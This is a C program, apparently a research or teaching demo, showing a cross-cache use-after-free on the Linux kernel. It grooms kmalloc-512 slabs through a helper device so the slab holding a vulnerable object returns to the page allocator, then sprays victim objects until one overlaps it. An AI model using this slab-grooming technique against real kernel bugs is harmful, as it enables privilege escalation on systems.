/* This file is a userspace exp to demonstrate the Cross-X cross-cache UAF on Linux kernel */
#include <stdio.h>
#include "heap_api.h"

#define CPU_PARTIAL 13
#define MIN_PARTIAL 5
#define OBJS_PER_SLAB 8

int main() {
    const char *device_path = HEAP_DEFAULT_DEVICE;
    heap_ctx_t ctx = { .fd = -1 };

    if (heap_open(&ctx, device_path) < 0) {
        printf("[-] open device failed\n");
        return -1;
    }

    /* Defragmentation */
    if(heap_defrag(&ctx, "kmalloc-512") < 0) {
        printf("[-] defrag failed\n");
        heap_close(&ctx);
        return -1;
    }
    printf("[+] defrag success\n");

    /* Allcoate (CPU_PARTIAL + 2) slabs. */
    for (int i = 0; i < CPU_PARTIAL + 2; i++) {
        for (int j = 0; j < OBJS_PER_SLAB; j++) {
            /* Allocate one vulnerable object in the first slab such that when the 
             * slabs are freed the same order as they were allocated, the first slab
             * will stay at the end of the freelist and be the last slab moved to 
             * the NUMA node, which eventually becomes the single slab recycled by 
             * the buddy allocator.
             */
            if (i == 0 && j == 0) {
                int vulobj_idx;    
                heap_alloc_vul(&ctx, 1, &vulobj_idx); 
            } else {
                int dmy_idx;
                heap_alloc_dummy(&ctx, 1, &dmy_idx);
            }
        }
    }
    // allocate a dummy object to kick off the current active slab
    int dmy_idx;
    heap_alloc_dummy(&ctx, 1, &dmy_idx);

    /* Free the first slab. */
    for (int i = 0; i < OBJS_PER_SLAB; i++) {
        if (i == 0) {
            heap_free_vul(&ctx, 0);
        } else {
            heap_free_dummy(&ctx, i - 1);
        }
    }
    /* Create the remaining partial slabs to trigger promotion. */
    for (int i = 1; i < CPU_PARTIAL + 2; i++) {
        heap_free_dummy(&ctx, i * OBJS_PER_SLAB - 1);
    }

    unsigned long addr;
    int found = 0;
    heap_get_addr(&ctx, HEAP_OBJ_VUL, 0, &addr);
    printf("[+] vulnerable object address: 0x%lx\n", addr);
    
    /* Spray victim object and check if there exists a victim overlapping with the vulnerable object. */
    for (int i = 0; i < 1000; i++) {
        int victim_idx;
        heap_alloc_victim(&ctx, 1, &victim_idx);
        unsigned long tmp_addr;
        heap_get_addr(&ctx, HEAP_OBJ_VICTIM, victim_idx, &tmp_addr);
        if (tmp_addr == addr) {
            printf("[+] found victim[%d] overlapping with the vulnerable object\n", victim_idx);
            found = 1;
            break;
        }
    }
    if (!found) {
        printf("[-] no victim overlapping with the vulnerable object\n");
    }

    heap_close(&ctx);
    return 0;
}